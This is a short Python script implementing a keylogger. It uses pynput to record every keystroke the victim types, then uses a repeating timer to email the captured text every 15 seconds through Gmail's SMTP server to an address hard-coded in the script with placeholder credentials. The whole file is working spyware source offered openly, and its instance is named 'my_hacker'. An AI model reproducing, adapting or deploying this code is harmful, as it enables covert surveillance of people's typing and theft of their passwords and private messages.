from pynput.keyboard import Key, Listener
# from datetime import datetime
import threading
import smtplib

# now = datetime.now()

class Keylogger:

    def __init__(self, email, password, timeinterval):
        self.k = "keylogger started"
        self.email = email
        self.passs = password
        self.timer = timeinterval

    def on_press(self, key):
        try:
            self.k = self.k + str(key.char)
        except AttributeError:
            if key == key.space:
                self.k = self.k + " "
            else:
                self.k = self.k + " " + str(key) + " "
        # print(k)


    def report(self):
        self.send_mail(self.email, self.passs, self.k)
        self.k = ""
        timer = threading.Timer(self.timer, self.report)
        timer.start()


    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)


    def start(self):
        with Listener(on_press=self.on_press) as lis:
            self.report()
            lis.join()

email = "abc@gmail.com"
password = "234yourpassword"
timeinterval = 15

my_hacker = Keylogger(email, password, timeinterval)
my_hacker.start()